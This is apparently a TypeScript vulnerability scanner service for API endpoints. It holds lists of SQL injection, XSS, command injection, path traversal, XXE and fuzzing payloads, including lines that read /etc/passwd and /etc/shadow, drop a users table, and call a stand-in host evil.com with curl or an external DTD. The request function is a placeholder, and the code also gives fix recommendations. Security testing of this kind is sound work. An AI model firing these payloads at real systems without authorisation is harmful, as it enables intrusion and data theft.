// Vulnerability Scanner Service
// Performs injection and fuzzing tests on API endpoints

export interface VulnerabilityTest {
  id: string;
  name: string;
  category: 'sql-injection' | 'xss' | 'command-injection' | 'path-traversal' | 'xxe' | 'fuzzing';
  severity: 'critical' | 'high' | 'medium' | 'low';
  payload: string;
  vulnerable: boolean;
  evidence?: string;
  response?: {
    status: number;
    body: string;
    time: number;
  };
}

export interface ScanResult {
  url: string;
  method: string;
  timestamp: Date;
  tests: VulnerabilityTest[];
  vulnerableCount: number;
  criticalCount: number;
  highCount: number;
  mediumCount: number;
  lowCount: number;
  totalTests: number;
}

export interface ScanOptions {
  url: string;
  method: string;
  headers?: Record<string, string>;
  body?: any;
  timeout?: number;
  enableSQLInjection?: boolean;
  enableXSS?: boolean;
  enableCommandInjection?: boolean;
  enablePathTraversal?: boolean;
  enableXXE?: boolean;
  enableFuzzing?: boolean;
}

export class VulnerabilityScannerService {
  /**
   * Run vulnerability scan
   */
  async runScan(options: ScanOptions): Promise<ScanResult> {
    const tests: VulnerabilityTest[] = [];

    // SQL Injection tests
    if (options.enableSQLInjection !== false) {
      tests.push(...await this.testSQLInjection(options));
    }

    // XSS tests
    if (options.enableXSS !== false) {
      tests.push(...await this.testXSS(options));
    }

    // Command Injection tests
    if (options.enableCommandInjection !== false) {
      tests.push(...await this.testCommandInjection(options));
    }

    // Path Traversal tests
    if (options.enablePathTraversal !== false) {
      tests.push(...await this.testPathTraversal(options));
    }

    // XXE tests
    if (options.enableXXE !== false) {
      tests.push(...await this.testXXE(options));
    }

    // Fuzzing tests
    if (options.enableFuzzing !== false) {
      tests.push(...await this.testFuzzing(options));
    }

    // Calculate statistics
    const stats = this.calculateStatistics(tests);

    return {
      url: options.url,
      method: options.method,
      timestamp: new Date(),
      tests,
      ...stats,
    };
  }

  /**
   * SQL Injection tests
   */
  private async testSQLInjection(options: ScanOptions): Promise<VulnerabilityTest[]> {
    const payloads = [
      "' OR '1'='1",
      "' OR '1'='1' --",
      "' OR '1'='1' /*",
      "admin' --",
      "admin' #",
      "' UNION SELECT NULL--",
      "' UNION SELECT NULL,NULL--",
      "1' AND '1'='1",
      "1' AND '1'='2",
      "' OR 1=1--",
      "; DROP TABLE users--",
      "' OR 'x'='x",
      "1; SELECT * FROM users",
      "' WAITFOR DELAY '00:00:05'--",
    ];

    const tests: VulnerabilityTest[] = [];

    for (const payload of payloads) {
      const test = await this.executeTest({
        name: `SQL Injection: ${payload.substring(0, 30)}...`,
        category: 'sql-injection',
        severity: 'critical',
        payload,
        options,
        detectVulnerability: (response) => {
          const body = response.body.toLowerCase();
          return (
            body.includes('sql syntax') ||
            body.includes('mysql') ||
            body.includes('ora-') ||
            body.includes('postgresql') ||
            body.includes('sqlite') ||
            body.includes('syntax error') ||
            body.includes('unclosed quotation') ||
            body.includes('quoted string not properly terminated') ||
            response.status === 500
          );
        },
      });
      tests.push(test);
    }

    return tests;
  }

  /**
   * XSS (Cross-Site Scripting) tests
   */
  private async testXSS(options: ScanOptions): Promise<VulnerabilityTest[]> {
    const payloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg/onload=alert("XSS")>',
      '"><script>alert(String.fromCharCode(88,83,83))</script>',
      '<iframe src="javascript:alert(\'XSS\')">',
      '<body onload=alert("XSS")>',
      '<input onfocus=alert("XSS") autofocus>',
      '<marquee onstart=alert("XSS")>',
      '<details open ontoggle=alert("XSS")>',
      'javascript:alert("XSS")',
      '<a href="javascript:alert(\'XSS\')">Click</a>',
    ];

    const tests: VulnerabilityTest[] = [];

    for (const payload of payloads) {
      const test = await this.executeTest({
        name: `XSS: ${payload.substring(0, 30)}...`,
        category: 'xss',
        severity: 'high',
        payload,
        options,
        detectVulnerability: (response) => {
          const body = response.body;
          // Check if payload is reflected without encoding
          return (
            body.includes(payload) ||
            body.includes(payload.replace(/"/g, '&quot;')) ||
            body.includes('<script') ||
            body.includes('onerror=') ||
            body.includes('onload=')
          );
        },
      });
      tests.push(test);
    }

    return tests;
  }

  /**
   * Command Injection tests
   */
  private async testCommandInjection(options: ScanOptions): Promise<VulnerabilityTest[]> {
    const payloads = [
      '; ls -la',
      '| ls -la',
      '& dir',
      '&& dir',
      '; cat /etc/passwd',
      '| cat /etc/passwd',
      '; whoami',
      '`whoami`',
      '$(whoami)',
      '; ping -c 10 127.0.0.1',
      '| sleep 10',
      '; curl http://evil.com',
    ];

    const tests: VulnerabilityTest[] = [];

    for (const payload of payloads) {
      const test = await this.executeTest({
        name: `Command Injection: ${payload.substring(0, 30)}...`,
        category: 'command-injection',
        severity: 'critical',
        payload,
        options,
        detectVulnerability: (response) => {
          const body = response.body.toLowerCase();
          return (
            body.includes('root:') ||
            body.includes('bin/bash') ||
            body.includes('command not found') ||
            body.includes('sh:') ||
            response.time > 5000 // Delay-based detection
          );
        },
      });
      tests.push(test);
    }

    return tests;
  }

  /**
   * Path Traversal tests
   */
  private async testPathTraversal(options: ScanOptions): Promise<VulnerabilityTest[]> {
    const payloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\win.ini',
      '....//....//....//etc/passwd',
      '..%2F..%2F..%2Fetc%2Fpasswd',
      '..%252F..%252F..%252Fetc%252Fpasswd',
      '/etc/passwd',
      'C:\\windows\\system32\\drivers\\etc\\hosts',
      '../../../../../../etc/shadow',
      '../../../../../../../../../../../etc/passwd',
    ];

    const tests: VulnerabilityTest[] = [];

    for (const payload of payloads) {
      const test = await this.executeTest({
        name: `Path Traversal: ${payload.substring(0, 30)}...`,
        category: 'path-traversal',
        severity: 'high',
        payload,
        options,
        detectVulnerability: (response) => {
          const body = response.body.toLowerCase();
          return (
            body.includes('root:') ||
            body.includes('[extensions]') ||
            body.includes('for 16-bit app support') ||
            body.includes('/bin/bash') ||
            body.includes('localhost')
          );
        },
      });
      tests.push(test);
    }

    return tests;
  }

  /**
   * XXE (XML External Entity) tests
   */
  private async testXXE(options: ScanOptions): Promise<VulnerabilityTest[]> {
    const payloads = [
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><foo>&xxe;</foo>',
    ];

    const tests: VulnerabilityTest[] = [];

    for (const payload of payloads) {
      const test = await this.executeTest({
        name: `XXE: External Entity`,
        category: 'xxe',
        severity: 'critical',
        payload,
        options,
        detectVulnerability: (response) => {
          const body = response.body.toLowerCase();
          return (
            body.includes('root:') ||
            body.includes('[extensions]') ||
            body.includes('/bin/bash')
          );
        },
      });
      tests.push(test);
    }

    return tests;
  }

  /**
   * Fuzzing tests
   */
  private async testFuzzing(options: ScanOptions): Promise<VulnerabilityTest[]> {
    const payloads = [
      'A'.repeat(10000), // Buffer overflow
      '%n%n%n%n%n', // Format string
      '${7*7}', // Template injection
      '{{7*7}}', // Template injection
      '<%= 7*7 %>', // Template injection
      '\x00', // Null byte
      '\r\n\r\n', // CRLF injection
      String.fromCharCode(0), // Null character
      '../../', // Path manipulation
      '../' + 'A'.repeat(1000), // Long path
    ];

    const tests: VulnerabilityTest[] = [];

    for (const payload of payloads) {
      const test = await this.executeTest({
        name: `Fuzzing: ${payload.substring(0, 30).replace(/\n/g, '\\n')}...`,
        category: 'fuzzing',
        severity: 'medium',
        payload,
        options,
        detectVulnerability: (response) => {
          return (
            response.status === 500 ||
            response.status === 400 ||
            response.body.includes('error') ||
            response.body.includes('exception') ||
            response.body.includes('49') || // 7*7
            response.time > 3000
          );
        },
      });
      tests.push(test);
    }

    return tests;
  }

  /**
   * Execute a single test
   */
  private async executeTest(params: {
    name: string;
    category: VulnerabilityTest['category'];
    severity: VulnerabilityTest['severity'];
    payload: string;
    options: ScanOptions;
    detectVulnerability: (response: { status: number; body: string; time: number }) => boolean;
  }): Promise<VulnerabilityTest> {
    try {
      // Inject payload into URL parameters
      const url = new URL(params.options.url);
      url.searchParams.set('test', params.payload);

      const startTime = Date.now();

      // Simulate HTTP request (in real implementation, use actual HTTP client)
      const response = await this.simulateRequest({
        url: url.toString(),
        method: params.options.method,
        headers: params.options.headers,
        body: params.payload,
        timeout: params.options.timeout || 5000,
      });

      const time = Date.now() - startTime;

      const vulnerable = params.detectVulnerability({
        status: response.status,
        body: response.body,
        time,
      });

      return {
        id: this.generateId(),
        name: params.name,
        category: params.category,
        severity: params.severity,
        payload: params.payload,
        vulnerable,
        evidence: vulnerable ? this.extractEvidence(response.body) : undefined,
        response: {
          status: response.status,
          body: response.body.substring(0, 500), // Limit body size
          time,
        },
      };
    } catch (error: any) {
      return {
        id: this.generateId(),
        name: params.name,
        category: params.category,
        severity: params.severity,
        payload: params.payload,
        vulnerable: false,
        evidence: `Error: ${error.message}`,
      };
    }
  }

  /**
   * Simulate HTTP request (placeholder - integrate with actual RequestService)
   */
  private async simulateRequest(params: {
    url: string;
    method: string;
    headers?: Record<string, string>;
    body?: any;
    timeout: number;
  }): Promise<{ status: number; body: string }> {
    // This is a placeholder - in real implementation, use RequestService
    return new Promise((resolve) => {
      setTimeout(() => {
        resolve({
          status: 200,
          body: JSON.stringify({ message: 'OK' }),
        });
      }, 100);
    });
  }

  /**
   * Extract evidence from response
   */
  private extractEvidence(body: string): string {
    const maxLength = 200;
    if (body.length > maxLength) {
      return body.substring(0, maxLength) + '...';
    }
    return body;
  }

  /**
   * Calculate statistics
   */
  private calculateStatistics(tests: VulnerabilityTest[]): {
    vulnerableCount: number;
    criticalCount: number;
    highCount: number;
    mediumCount: number;
    lowCount: number;
    totalTests: number;
  } {
    const vulnerableTests = tests.filter(t => t.vulnerable);

    return {
      vulnerableCount: vulnerableTests.length,
      criticalCount: vulnerableTests.filter(t => t.severity === 'critical').length,
      highCount: vulnerableTests.filter(t => t.severity === 'high').length,
      mediumCount: vulnerableTests.filter(t => t.severity === 'medium').length,
      lowCount: vulnerableTests.filter(t => t.severity === 'low').length,
      totalTests: tests.length,
    };
  }

  /**
   * Generate unique ID
   */
  private generateId(): string {
    return `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
  }

  /**
   * Get vulnerability summary
   */
  getSummary(result: ScanResult): string {
    const lines: string[] = [];

    lines.push(`Vulnerability Scan Results`);
    lines.push(`URL: ${result.url}`);
    lines.push(`Method: ${result.method}`);
    lines.push(`Total Tests: ${result.totalTests}`);
    lines.push(`Vulnerabilities Found: ${result.vulnerableCount}`);
    lines.push(`  Critical: ${result.criticalCount}`);
    lines.push(`  High: ${result.highCount}`);
    lines.push(`  Medium: ${result.mediumCount}`);
    lines.push(`  Low: ${result.lowCount}`);

    return lines.join('\n');
  }

  /**
   * Export scan result as JSON
   */
  exportResult(result: ScanResult): string {
    return JSON.stringify(result, null, 2);
  }

  /**
   * Get recommended fixes
   */
  getRecommendations(result: ScanResult): string[] {
    const recommendations: string[] = [];
    const vulnerableTests = result.tests.filter(t => t.vulnerable);

    const categories = new Set(vulnerableTests.map(t => t.category));

    if (categories.has('sql-injection')) {
      recommendations.push('Use parameterized queries or prepared statements to prevent SQL injection');
    }

    if (categories.has('xss')) {
      recommendations.push('Encode user input before displaying it in HTML to prevent XSS');
    }

    if (categories.has('command-injection')) {
      recommendations.push('Avoid executing system commands with user input; use safe APIs instead');
    }

    if (categories.has('path-traversal')) {
      recommendations.push('Validate and sanitize file paths; use whitelisting for allowed files');
    }

    if (categories.has('xxe')) {
      recommendations.push('Disable external entity processing in XML parsers');
    }

    if (categories.has('fuzzing')) {
      recommendations.push('Implement input validation and proper error handling');
    }

    return recommendations;
  }
}

// Singleton instance
let vulnerabilityScannerServiceInstance: VulnerabilityScannerService | null = null;

export function getVulnerabilityScannerService(): VulnerabilityScannerService {
  if (!vulnerabilityScannerServiceInstance) {
    vulnerabilityScannerServiceInstance = new VulnerabilityScannerService();
  }
  return vulnerabilityScannerServiceInstance;
}
